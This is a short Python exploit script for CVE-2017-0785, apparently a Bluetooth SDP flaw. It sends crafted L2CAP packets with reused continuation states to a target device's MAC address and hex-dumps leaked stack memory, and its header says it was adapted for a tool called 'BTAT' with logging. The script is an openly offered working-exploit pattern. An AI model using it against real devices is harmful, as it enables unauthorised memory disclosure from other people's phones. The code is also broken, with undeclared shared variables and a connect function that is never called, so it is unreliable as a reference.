'''
Modified CVE-2017-0785.py
to work with BTAT and return values for logging

by @brentru, @daustin1, @epires3
'''

from pwn import *
import bluetooth

if not 'TARGET' in args:
    log.info("Usage: CVE-2017-0785.py TARGET=XX:XX:XX:XX:XX:XX")
    exit()

target = args['TARGET']
service_long = 0x0100
service_short = 0x0001
mtu = 50
n = 30

# holds sock rcv
data  = 0
# holds stack str rcv
stack = ''

def packet(service, continuation_state):
    pkt = '\x02\x00\x00'
    pkt += p16(7 + len(continuation_state))
    pkt += '\x35\x03\x19'
    pkt += p16(service)
    pkt += '\x01\x00'
    pkt += continuation_state
    return pkt

def evalVuln():
    if data[-3] != '\x02':
        # device not vulnerable to attack
        log.error('Invalid continuation state received.')
    for i in range(1, n):
        p.status('Sending packet %d' % i)
        sock.send(packet(service_short, data[-3:]))
        data = sock.recv(mtu)
        stack += data[9:-3]
    sock.close()
    # log success
    p.success('Done')
    # dump the stack
    print hexdump(stack)

def connectToDevice():
    p.status('Connecting to target')
    sock.connect((target, 1))
    p.status('Sending packet 0')
    sock.send(packet(service_long, '\x00'))
    data = sock.recv(mtu)
    evalVuln()

def makeSocket():
    p.status('Creating L2CAP socket...')
    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bluetooth.set_l2cap_mtu(sock, mtu)
    context.endian = 'big'
    if (context.endian == 'big'):
        connectToDevice
    else:
        p.status('couldnt connect to target')

def main():
    p = log.progress('BEGIN Exploit..')
    makeSocket()


if __name__ == '__main__':
    main()
